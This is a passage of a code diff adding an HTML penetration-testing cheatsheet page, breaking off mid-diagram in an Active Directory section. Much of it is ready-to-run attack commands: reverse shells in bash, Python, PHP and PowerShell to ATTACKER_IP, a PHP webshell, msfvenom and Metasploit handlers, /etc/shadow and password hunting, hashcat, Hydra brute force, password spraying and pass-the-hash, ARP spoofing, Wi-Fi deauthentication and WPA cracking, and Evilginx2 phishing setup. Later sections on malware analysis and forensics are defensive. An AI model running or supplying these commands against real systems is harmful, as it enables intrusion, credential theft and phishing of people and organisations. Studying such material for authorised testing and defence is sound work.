+msfvenom -p cmd/unix/reverse_bash LHOST=attacker_ip LPORT=4444 -f raw</code></pre>
+            
+            <h3>Reverse Shell Cheatsheet</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Bash Reverse Shell</div>
+                    <pre><code class="language-bash"># Bash TCP
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Bash UDP
+bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1
+
+# Exec wrapper
+exec 5<>/dev/tcp/ATTACKER_IP/4444
+cat <&5 | while read line; do $line 2>&5 >&5; done</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Python Reverse Shell</div>
+                    <pre><code class="language-python"># Python 3
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Python 2
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">PHP Reverse Shell</div>
+                    <pre><code class="language-php">// PHP reverse shell
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+// Full PHP webshell
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?></code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">PowerShell Reverse Shell</div>
+                    <pre><code class="language-powershell"># PowerShell one-liner
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+                </div>
+            </div>
+            
+            <h3>Listener Setup</h3>
+            <pre><code class="language-bash"># Netcat listener
+nc -lvnp 4444
+
+# Netcat with command execution
+nc -lvnp 4444 -e /bin/bash        # Linux
+nc -lvnp 4444 -e cmd.exe          # Windows
+
+# Socat listener (more stable)
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+# RLwrap for better shell
+rlwrap nc -lvnp 4444
+
+# Multi-handler in Metasploit
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST attacker_ip
+msf6 exploit(multi/handler) > exploit</code></pre>
+            
+            <h3>Privilege Escalation</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│              PRIVILEGE ESCALATION METHODOLOGY                        │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   ┌─────────────────┐      ┌─────────────────┐                      │
+│   │  Initial Access │─────▶│  Enumeration    │                      │
+│   │  (Low Privilege)│      │  (Recon)        │                      │
+│   └─────────────────┘      └─────────────────┘                      │
+│                                   │                                  │
+│                                   ▼                                  │
+│   ┌─────────────────────────────────────────────────────┐           │
+│   │         Privilege Escalation Vectors                 │           │
+│   ├─────────────────────────────────────────────────────┤           │
+│   │                                                      │           │
+│   │   ┌──────────────┐  ┌──────────────┐                │           │
+│   │   │ Kernel Exploits│  │ SUID/SGID   │                │           │
+│   │   │ (Dirty COW,   │  │ Binaries    │                │           │
+│   │   │ CVE exploits) │  │              │                │           │
+│   │   └──────────────┘  └──────────────┘                │           │
+│   │                                                      │           │
+│   │   ┌──────────────┐  ┌──────────────┐                │           │
+│   │   │ Sudo Misconfig│  │ Cron Jobs   │                │           │
+│   │   │ (sudo -l)    │  │ (Writable)  │                │           │
+│   │   └──────────────┘  └──────────────┘                │           │
+│   │                                                      │           │
+│   │   ┌──────────────┐  ┌──────────────┐                │           │
+│   │   │ Capabilities │  │ Writable     │                │           │
+│   │   │ (capsh)      │  │ Path/Scripts │                │           │
+│   │   └──────────────┘  └──────────────┘                │           │
+│   │                                                      │           │
+│   └─────────────────────────────────────────────────────┘           │
+│                                   │                                  │
+│                                   ▼                                  │
+│   ┌─────────────────────────────────────────────────────┐           │
+│   │  │ ROOT/SYSTEM ACCESS │                             │           │
+│   └─────────────────────────────────────────────────────┘           │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h4>Linux Privilege Escalation</h4>
+            <pre><code class="language-bash"># Automated enumeration scripts
+LinPEAS: ./linpeas.sh
+LinEnum: ./LinEnum.sh
+Linux Exploit Suggester: ./linux-exploit-suggester.sh
+
+# Manual enumeration commands
+id                          # Current user and groups
+whoami                      # Current username
+uname -a                    # Kernel version
+cat /etc/os-release         # OS information
+cat /proc/version           # Kernel info
+
+# SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# Sudo permissions
+sudo -l                     # List allowed commands
+
+# Capabilities
+getcap -r / 2>/dev/null
+capsh --print
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+
+# Writable paths
+echo $PATH
+find / -writable -type d 2>/dev/null
+
+# Password hunting
+grep -r "password" /var/www/ 2>/dev/null
+cat /etc/shadow
+find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null</code></pre>
+            
+            <h4>Windows Privilege Escalation</h4>
+            <pre><code class="language-powershell"># Automated enumeration
+WinPEAS: .\winpeas.exe
+PowerUp: Invoke-AllChecks
+PrivescCheck: Invoke-PrivescCheck
+
+# Manual enumeration
+whoami /all                # Current user info
+systeminfo                 # System information
+net users                  # List users
+net localgroup administrators
+net use                    # Mounted shares
+
+# Service enumeration
+wmic service list brief
+sc query                   # Service status
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+# Unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
+
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Kernel exploits (search by OS version)
+# Example: PrintNightmare, ZeroLogon, etc.</code></pre>
+        </section>
+
+        <!-- Section 6: Password Cracking -->
+        <section class="section">
+            <h2>Password Cracking & Hash Identification</h2>
+            <p>Password cracking is an essential skill for penetration testers to assess password policies and test credential security. Understanding hash types and cracking techniques is crucial.</p>
+            
+            <h3>Hash Identification</h3>
+            <table>
+                <tr>
+                    <th>Hash Type</th>
+                    <th>Length</th>
+                    <th>Example</th>
+                    <th>Hashcat Mode</th>
+                </tr>
+                <tr>
+                    <td>MD5</td>
+                    <td>32 chars</td>
+                    <td>5f4dcc3b5aa765d61d8327deb882cf99</td>
+                    <td>0</td>
+                </tr>
+                <tr>
+                    <td>SHA-1</td>
+                    <td>40 chars</td>
+                    <td>5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</td>
+                    <td>100</td>
+                </tr>
+                <tr>
+                    <td>SHA-256</td>
+                    <td>64 chars</td>
+                    <td>5e884898da28047d9...</td>
+                    <td>1400</td>
+                </tr>
+                <tr>
+                    <td>NTLM</td>
+                    <td>32 chars</td>
+                    <td>32ed87bdb5fdc5e9cba88547376...</td>
+                    <td>1000</td>
+                </tr>
+                <tr>
+                    <td>bcrypt</td>
+                    <td>60 chars</td>
+                    <td>$2a$10$N9qo8uLOickgx2Z...</td>
+                    <td>3200</td>
+                </tr>
+                <tr>
+                    <td>MySQL5</td>
+                    <td>41 chars</td>
+                    <td>*E6CC90B878B948C35E92...</td>
+                    <td>300</td>
+                </tr>
+                <tr>
+                    <td>LM</td>
+                    <td>32 chars</td>
+                    <td>aad3b435b51404ee...</td>
+                    <td>3000</td>
+                </tr>
+            </table>
+            
+            <h3>Hashcat - GPU Password Cracking</h3>
+            <pre><code class="language-bash"># Basic syntax
+hashcat -m [mode] -a [attack] hash.txt wordlist.txt
+
+# Attack modes
+# -a 0: Dictionary attack
+# -a 1: Combination attack
+# -a 3: Brute force attack
+# -a 6: Hybrid (wordlist + mask)
+# -a 7: Hybrid (mask + wordlist)
+
+# Dictionary attack
+hashcat -m 0 -a 0 hashes.txt wordlist.txt
+
+# Brute force (mask attack)
+hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a
+# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all
+
+# Rule-based attack
+hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
+
+# Show cracked passwords
+hashcat -m 0 hashes.txt --show
+
+# Benchmark
+hashcat -b</code></pre>
+            
+            <h3>John the Ripper</h3>
+            <pre><code class="language-bash"># Basic cracking
+john --wordlist=wordlist.txt hashes.txt
+
+# Format specification
+john --format=raw-md5 --wordlist=wordlist.txt hashes.txt
+john --format=nt --wordlist=wordlist.txt ntlm_hashes.txt
+john --format=bcrypt --wordlist=wordlist.txt bcrypt_hashes.txt
+
+# Shadow file cracking
+unshadow /etc/passwd /etc/shadow > combined.txt
+john --wordlist=wordlist.txt combined.txt
+
+# Show cracked
+john --show hashes.txt
+
+# Incremental mode (brute force)
+john --incremental hashes.txt
+
+# Session management
+john --restore=session_name
+john --session=new_session hashes.txt</code></pre>
+            
+            <h3>Online Password Attacks</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Hydra</div>
+                    <pre><code class="language-bash"># SSH brute force
+hydra -l user -P wordlist.txt ssh://target_ip
+
+# FTP brute force
+hydra -l admin -P wordlist.txt ftp://target_ip
+
+# HTTP POST form
+hydra -l admin -P wordlist.txt target_ip http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+# Multiple targets
+hydra -L users.txt -P passwords.txt -M targets.txt ssh
+
+# RDP brute force
+hydra -l admin -P wordlist.txt rdp://target_ip</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">CrackMapExec</div>
+                    <pre><code class="language-bash"># SMB enumeration + brute force
+crackmapexec smb target_ip -u users.txt -p passwords.txt
+
+# Password spray
+crackmapexec smb target_ip -u users.txt -p 'Password123'
+
+# Pass-the-hash
+crackmapexec smb target_ip -u admin -H 'LMHASH:NTHASH'
+
+# WinRM access
+crackmapexec winrm target_ip -u admin -p password
+
+# Execute command
+crackmapexec smb target_ip -u admin -p pass -x 'whoami'</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 7: Network Security -->
+        <section class="section">
+            <h2>Network Security & Attacks</h2>
+            <p>Network security testing involves analyzing network infrastructure for vulnerabilities, misconfigurations, and potential attack vectors.</p>
+            
+            <h3>Man-in-the-Middle Attacks</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                MAN-IN-THE-MIDDLE ATTACK FLOW                         │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   Normal Communication:                                              │
+│   ┌──────────┐                      ┌──────────┐                    │
+│   │  Victim  │─────────────────────▶│  Server  │                    │
+│   │          │◀─────────────────────│          │                    │
+│   └──────────┘                      └──────────┘                    │
+│                                                                      │
+│   MITM Attack:                                                       │
+│   ┌──────────┐        ┌──────────┐        ┌──────────┐             │
+│   │  Victim  │───────▶│ Attacker │───────▶│  Server  │             │
+│   │          │◀───────│  (MITM)  │◀───────│          │             │
+│   └──────────┘        └──────────┘        └──────────┘             │
+│                               │                                      │
+│                               ▼                                      │
+│                        [Intercept & Modify]                          │
+│                                                                      │
+│   Techniques: ARP Spoofing, DNS Spoofing, DHCP Spoofing,            │
+│               SSL Stripping, Evil Twin, ICMP Redirect               │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>ARP Spoofing</h3>
+            <pre><code class="language-bash"># Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Bettercap - Modern MITM framework
+sudo bettercap -iface eth0
+
+# Bettercap ARP spoofing
+net.probe on
+arp.spoof on
+net.sniff on
+
+# Arpspoof (dsniff package)
+arpspoof -i eth0 -t victim_ip gateway_ip
+arpspoof -i eth0 -t gateway_ip victim_ip
+
+# Ettercap
+sudo ettercap -T -M arp:remote /victim_ip/ /gateway_ip/</code></pre>
+            
+            <h3>Wi-Fi Security Testing</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Aircrack-ng Suite</div>
+                    <pre><code class="language-bash"># Monitor mode
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+# Capture handshake
+airodump-ng -c [channel] --bssid [AP_MAC] -w capture wlan0mon
+
+# Deauth attack
+aireplay-ng -0 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
+
+# Crack WPA2
+aircrack-ng -w wordlist.txt capture-01.cap
+
+# WEP cracking (outdated)
+aircrack-ng capture-01.cap</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">WPA2/WPA3 Attacks</div>
+                    <pre><code class="language-bash"># PMKID attack (no client needed)
+hcxdumptool -o dump.pcapng -i wlan0mon --enable_status=1
+hcxpcapngtool -o hash.txt dump.pcapng
+hashcat -m 22000 hash.txt wordlist.txt
+
+# Evil Twin attack
+hostapd-wpe evil_twin.conf
+
+# WPS attacks
+reaver -i wlan0mon -b [BSSID] -vv
+bully -b [BSSID] -c [channel] wlan0mon</code></pre>
+                </div>
+            </div>
+            
+            <h3>Network Defense Mechanisms</h3>
+            <table>
+                <tr>
+                    <th>Attack</th>
+                    <th>Detection</th>
+                    <th>Prevention</th>
+                </tr>
+                <tr>
+                    <td>ARP Spoofing</td>
+                    <td>ARP monitoring tools, Static ARP tables</td>
+                    <td>Dynamic ARP Inspection, Port Security</td>
+                </tr>
+                <tr>
+                    <td>DNS Spoofing</td>
+                    <td>DNS monitoring, Unexpected responses</td>
+                    <td>DNSSEC, DNS filtering</td>
+                </tr>
+                <tr>
+                    <td>DHCP Spoofing</td>
+                    <td>DHCP snooping alerts</td>
+                    <td>DHCP Snooping, IP Source Guard</td>
+                </tr>
+                <tr>
+                    <td>SSL Stripping</td>
+                    <td>Certificate warnings, HSTS</td>
+                    <td>HSTS, Certificate Pinning</td>
+                </tr>
+                <tr>
+                    <td>Port Scanning</td>
+                    <td>IDS/IPS alerts, Rate limiting</td>
+                    <td>Firewall rules, Port knocking</td>
+                </tr>
+            </table>
+        </section>
+
+        <!-- Section 8: Wireless Security -->
+        <section class="section">
+            <h2>Wireless Security</h2>
+            <p>Wireless networks present unique security challenges due to their broadcast nature. Understanding wireless protocols and their vulnerabilities is essential for comprehensive security testing.</p>
+            
+            <h3>Wireless Encryption Types</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                WIRELESS SECURITY PROTOCOLS                           │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ WEP (Wired Equivalent Privacy) - DEPRECATED                │   │
+│   │   • RC4 stream cipher with 40/104-bit key                  │   │
+│   │   • IV vulnerabilities (24-bit)                            │   │
+│   │   • Cracked in minutes                                     │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ WPA (Wi-Fi Protected Access)                               │   │
+│   │   • TKIP encryption                                        │   │
+│   │   • Still vulnerable to various attacks                    │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ WPA2 (Current Standard)                                    │   │
+│   │   • AES-CCMP encryption                                    │   │
+│   │   • 4-way handshake (can be captured)                      │   │
+│   │   • KRACK attack vulnerability                             │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ WPA3 (Latest Standard)                                     │   │
+│   │   • SAE (Simultaneous Authentication of Equals)            │   │
+│   │   • Forward secrecy                                        │   │
+│   │   • Protection against offline dictionary attacks          │   │
+│   │   • Dragonfly attack (some implementations)                │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Wireless Attack Methodology</h3>
+            <pre><code class="language-bash"># 1. Discovery
+airodump-ng wlan0mon                    # Scan all networks
+airodump-ng wlan0mon --encrypt wpa2     # WPA2 networks only
+airodump-ng wlan0mon --band bg          # 2.4GHz only
+airodump-ng wlan0mon --band a           # 5GHz only
+
+# 2. Target Selection & Capture
+airodump-ng -c [channel] --bssid [target] -w capture wlan0mon
+
+# 3. Client Deauthentication (to force reconnection)
+aireplay-ng -0 5 -a [AP_BSSID] wlan0mon           # Broadcast deauth
+aireplay-ng -0 5 -a [AP_BSSID] -c [CLIENT_MAC] wlan0mon  # Targeted
+
+# 4. Handshake Verification
+aircrack-ng capture-01.cap | grep "handshake"
+
+# 5. Offline Cracking
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] capture-01.cap
+
+# 6. Hashcat for faster cracking
+hcxpcapngtool -o hash.hc22000 capture-01.cap
+hashcat -m 22000 hash.hc22000 wordlist.txt</code></pre>
+            
+            <h3>Enterprise Wireless (WPA2/WPA3-Enterprise)</h3>
+            <pre><code class="language-bash"># Capture Enterprise handshake
+airodump-ng -c [channel] --bssid [target] -w enterprise wlan0mon
+
+# Create rogue AP for credential capture
+hostapd-wpe rogue.conf
+# Captures MS-CHAPv2 challenges
+
+# Crack captured credentials
+asleap -C challenge -R response -W wordlist.txt
+
+# Certificate validation bypass
+# Tools: Fluxion, WiFi Phisher (social engineering)</code></pre>
+        </section>
+
+        <!-- Section 9: Social Engineering -->
+        <section class="section">
+            <h2>Social Engineering</h2>
+            <p>Social engineering exploits human psychology rather than technical vulnerabilities. It often proves to be the most effective attack vector in penetration testing.</p>
+            
+            <h3>Social Engineering Framework</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│               SOCIAL ENGINEERING ATTACK CYCLE                        │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐     │
+│   │  Gather  │───▶│  Plan    │───▶│  Execute │───▶│  Exit    │     │
+│   │  Info    │    │  Attack  │    │  Attack  │    │  Clean   │     │
+│   └──────────┘    └──────────┘    └──────────┘    └──────────┘     │
+│        │               │               │               │            │
+│        ▼               ▼               ▼               ▼            │
+│   ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐     │
+│   │ OSINT    │    │ Scenario │    │ Phishing │    │ Cover    │     │
+│   │ Research │    │ Crafting │    │ Vishing  │    │ Tracks   │     │
+│   │ Targeting│    │ Pretext  │    │ Imperson │    │ Report   │     │
+│   └──────────┘    └──────────┘    └──────────┘    └──────────┘     │
+│                                                                      │
+│   Key Principles: Authority, Urgency, Scarcity, Reciprocity,        │
+│                   Consistency, Liking, Social Proof                 │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Phishing Tools & Techniques</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Gophish</div>
+                    <p>Open-source phishing framework for security testing.</p>
+                    <pre><code class="language-bash"># Start Gophish
+./gophish
+
+# Access web interface
+https://localhost:3333
+
+# Components:
+# - Users & Groups
+# - Email Templates
+# - Landing Pages
+# - Sending Profiles
+# - Campaigns</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">SET (Social Engineering Toolkit)</div>
+                    <pre><code class="language-bash"># Start SET
+sudo setoolkit
+
+# Common attacks:
+# 1) Social-Engineering Attacks
+# 2) Penetration Testing (Fast-Track)
+# 3) Third Party Modules
+
+# Spear-Phishing Attack Vectors
+# 1) Perform a Mass Email Attack
+# 2) Create a FilePayload
+# 3) Create a Social Engineering Template</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Evilginx2</div>
+                    <p>Man-in-the-middle attack framework for phishing.</p>
+                    <pre><code class="language-bash"># Start Evilginx2
+sudo evilginx
+
+# Configure
+config domain yourdomain.com
+config ip your_server_ip
+
+# Setup phishlet
+phishlets hostname google yourdomain.com
+phishlets enable google
+
+# Create lure
+lures create google
+lures get-url 0</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">King Phisher</div>
+                    <pre><code class="language-bash"># Server start
+python3 king_phisher/server.py
+
+# Client start
+python3 king_phisher/client.py
+
+# Features:
+# - Campaign management
+# - Web cloning
+# - Email templates
+# - Analytics dashboard</code></pre>
+                </div>
+            </div>
+            
+            <div class="warning-box">
+                <div>
+                    <strong>Ethical Considerations:</strong> Social engineering campaigns should only be conducted with explicit written authorization. Always establish clear boundaries and escalation procedures before testing. Deception should be minimized and all activities documented.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 10: Malware Analysis -->
+        <section class="section">
+            <h2>Malware Analysis Basics</h2>
+            <p>Understanding malware behavior is crucial for security professionals. Analysis techniques help identify indicators of compromise (IOCs) and develop defenses.</p>
+            
+            <h3>Analysis Types</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│                    MALWARE ANALYSIS TYPES                            │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ STATIC ANALYSIS                                             │   │
+│   │   • Examine without execution                               │   │
+│   │   • File hashes, strings, imports                           │   │
+│   │   • Disassembly, decompilation                              │   │
+│   │   • Tools: IDA Pro, Ghidra, strings, PE-bear               │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ DYNAMIC ANALYSIS                                            │   │
+│   │   • Execute in controlled environment                       │   │
+│   │   • Monitor behavior, file system, registry, network       │   │
+│   │   • Tools: Sandbox, Process Monitor, Wireshark             │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+│   ┌─────────────────────────────────────────────────────────────┐   │
+│   │ HYBRID ANALYSIS                                             │   │
+│   │   • Combination of static and dynamic                      │   │
+│   │   • Comprehensive understanding                             │   │
+│   │   • Tools: ANY.RUN, Hybrid Analysis, Joe Sandbox           │   │
+│   └─────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+└─────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Static Analysis Commands</h3>
+            <pre><code class="language-bash"># File hashes
+md5sum malware.exe
+sha256sum malware.exe
+
+# File type identification
+file malware.exe
+xxd malware.exe | head -n 20
+
+# Strings extraction
+strings -n 8 malware.exe
+strings -e l malware.exe          # Unicode strings
+
+# PE header analysis
+pecheck malware.exe
+python pefile.py malware.exe
+
+# EXIFTool metadata
+exiftool malware.exe
+
+# YARA rules
+yara -r suspicious.yar malware.exe
+
+# VirusTotal query (hash)
+# https://www.virustotal.com/gui/file/{hash}/detection</code></pre>
+            
+            <h3>Dynamic Analysis Setup</h3>
+            <pre><code class="language-bash"># Windows Sandbox/VM setup
+# Snapshot clean state before analysis
+
+# Process monitoring
+Procmon.exe /backingfile log.pml
+
+# Network capture
+wireshark
+tcpdump -i eth0 -w capture.pcap
+
+# Registry monitoring
+regshot.exe  # Take before/after snapshots
+
+# API monitoring
+API Monitor
+ Rohitab's API Monitor
+
+# Behavioral analysis
+# ANY.RUN: https://any.run
+# Hybrid Analysis: https://www.hybrid-analysis.com
+# Joe Sandbox: https://www.joesandbox.com</code></pre>
+            
+            <h3>Common IOC Types</h3>
+            <table>
+                <tr>
+                    <th>IOC Type</th>
+                    <th>Examples</th>
+                    <th>Detection Method</th>
+                </tr>
+                <tr>
+                    <td>File Hash</td>
+                    <td>MD5, SHA1, SHA256</td>
+                    <td>Hash comparison, YARA</td>
+                </tr>
+                <tr>
+                    <td>Network</td>
+                    <td>IPs, Domains, URLs</td>
+                    <td>DNS logs, Proxy logs, Firewall</td>
+                </tr>
+                <tr>
+                    <td>Registry</td>
+                    <td>Persistence keys, Modified values</td>
+                    <td>Registry monitoring, EDR</td>
+                </tr>
+                <tr>
+                    <td>File System</td>
+                    <td>Dropped files, Modified files</td>
+                    <td>FIM, EDR</td>
+                </tr>
+                <tr>
+                    <td>Memory</td>
+                    <td>Injected code, Hooked APIs</td>
+                    <td>Memory forensics, EDR</td>
+                </tr>
+            </table>
+        </section>
+
+        <!-- Section 11: Digital Forensics -->
+        <section class="section">
+            <h2>Digital Forensics</h2>
+            <p>Digital forensics involves the preservation, acquisition, analysis, and presentation of digital evidence. This discipline is essential for incident response and legal proceedings.</p>
+            
+            <h3>Forensic Investigation Process</h3>
+            <div class="attack-flow">
+                <span class="step">Identification</span>
+                <span class="arrow">→</span>
+                <span class="step">Preservation</span>
+                <span class="arrow">→</span>
+                <span class="step">Collection</span>
+                <span class="arrow">→</span>
+                <span class="step">Analysis</span>
+                <span class="arrow">→</span>
+                <span class="step">Presentation</span>
+            </div>
+            
+            <h3>Disk Forensics</h3>
+            <pre><code class="language-bash"># Create disk image (write blocker recommended)
+dd if=/dev/sdb of=disk.img bs=4M status=progress
+dc3dd if=/dev/sdb of=disk.img hash=md5 log=dd.log
+
+# Acquire with verification
+dd if=/dev/sdb | ssh user@forensic-server "dd of=disk.img"
+
+# Sleuth Kit Commands
+# File system information
+fsstat disk.img
+
+# List files
+fls disk.img
+fls -r disk.img            # Recursive
+
+# List deleted files
+fls -d disk.img
+
+# File content extraction
+icat disk.img [inode] > file.txt
+
+# Timeline analysis
+mactime -b bodyfile 2023-01-01..2023-12-31
+
+# Autopsy (GUI for Sleuth Kit)
+autopsy &</code></pre>
+            
+            <h3>Memory Forensics</h3>
+            <pre><code class="language-bash"># Memory acquisition
+# Windows
+winpmem.exe memory.raw
+
+# Linux
+lime.ko "format=raw path=memory.raw"
+
+# Volatility 2
+volatility -f memory.raw --profile=Win10x64_19041 pslist
+volatility -f memory.raw --profile=Win10x64_19041 pstree
+volatility -f memory.raw --profile=Win10x64_19041 netscan
+volatility -f memory.raw --profile=Win10x64_19041 malfind
+volatility -f memory.raw --profile=Win10x64_19041 hashdump
+
+# Volatility 3
+python3 vol.py -f memory.raw windows.pslist
+python3 vol.py -f memory.raw windows.pstree
+python3 vol.py -f memory.raw windows.netscan
+python3 vol.py -f memory.raw windows.malfind
+
+# Identify profile
+volatility -f memory.raw imageinfo</code></pre>
+            
+            <h3>Network Forensics</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Wireshark Analysis</div>
+                    <ul>
+                        <li><strong>ip.addr == x.x.x.x</strong> - Filter by IP</li>
+                        <li><strong>tcp.port == 443</strong> - Filter by port</li>
+                        <li><strong>http</strong> - HTTP traffic</li>
+                        <li><strong>dns</strong> - DNS queries</li>
+                        <li><strong>Follow TCP Stream</strong> - Reconstruct sessions</li>
+                        <li><strong>Statistics → Conversations</strong> - Overview</li>
+                    </ul>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">tshark (CLI Wireshark)</div>
+                    <pre><code class="language-bash"># Read PCAP
+tshark -r capture.pcap
+
+# Filter
+tshark -r capture.pcap -Y "http"
+
+# Extract HTTP objects
+tshark -r capture.pcap --export-objects http,./output
+
+# Statistics
+tshark -r capture.pcap -q -z conv,tcp</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 12: Active Directory -->
+        <section class="section">
+            <h2>Active Directory Security</h2>
+            <p>Active Directory is the most common identity management system in enterprise environments. Understanding AD security is crucial for internal penetration testing.</p>
+            
+            <h3>AD Attack Methodology</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────┐
+│              ACTIVE DIRECTORY ATTACK PATHS                           │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                      │
+│   ┌────────────────────────────────────────────────────────────┐    │
+│   │                 INITIAL ACCESS                              │    │
+│   │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │    │
+│   │  │ Phishing    │  │ Password    │  │ AS-REP      │        │    │
+│   │  │             │  │ Spraying    │  │ Roasting    │        │    │
+│   │  └─────────────┘  └─────────────┘  └─────────────┘        │    │
+│   └────────────────────────────────────────────────────────────┘    │
+│                              │                                       │
+│                              ▼                                       │
+│   ┌────────────────────────────────────────────────────────────┐    │
+│   │                 ENUMERATION                                │    │
+│   │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │    │
+│   │  │ Domain      │  │ BloodHound  │  │ Group       │        │    │
+│   │  │ Users/Groups│  │ Mapping     │  │ Membership  │        │    │
+│   │  └─────────────┘  └─────────────┘  └─────────────┘        │    │
+│   └────────────────────────────────────────────────────────────┘    │
+│                              │                                       │
+│                              ▼                                       │
+│   ┌────────────────────────────────────────────────────────────┐    │
+│   │                 LATERAL MOVEMENT                           │    │
+│   │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │    │
+│   │  │ Pass-the-   │  │ Overpass-   │  │ DCOM/       │        │    │
+│   │  │ Hash/Ticket │  │ the-Hash    │  │ WMI         │        │    │
+│   │  └─────────────┘  └─────────────┘  └─────────────┘        │    │
+│   └────────────────────────────────────────────────────────────┘    │
+│                              │                                       │
+│                              ▼                                       │
+│   ┌────────────────────────────────────────────────────────────┐    │
+│   │                 DOMAIN DOMINANCE                           │    │
+│   │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐        │    │
+│   │  │ DCSync      │  │ Golden      │  │ Skeleton    │        │    │
